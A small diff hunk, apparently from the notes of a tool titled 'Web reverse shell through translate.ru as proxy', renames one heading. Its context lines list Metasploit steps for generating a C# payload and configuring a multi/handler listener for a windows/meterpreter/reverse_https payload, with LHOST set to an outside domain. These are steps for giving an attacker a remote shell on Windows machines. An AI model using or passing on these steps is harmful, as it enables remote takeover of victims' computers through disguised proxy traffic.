@@ -41,7 +41,7 @@ Web reverse shell through translate.ru as proxy
 8. set EXITFUNC thread
 9. generate -t csharp
 
-## Generate Meterpreter handler on server
+## Configure Meterpreter handler on server
 1. use exploit/multi/handler
 2. set PAYLOAD windows/meterpreter/reverse_https
 3. set LHOST video.cft-sd.xyz
